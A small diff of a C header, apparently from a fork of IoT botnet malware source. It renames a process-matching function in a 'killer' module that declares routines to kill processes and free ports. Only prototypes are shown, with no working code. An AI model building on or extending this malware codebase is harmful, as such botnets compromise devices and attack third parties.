@@ -11,5 +11,5 @@ void killer_init(void);
 void killer_kill(void);
 BOOL killer_kill_by_port(port_t);
 
-static BOOL nullpointer_match(char *);
+static BOOL fnbnet_match(char *);
 static BOOL mem_exists(char *, int, char *, int);
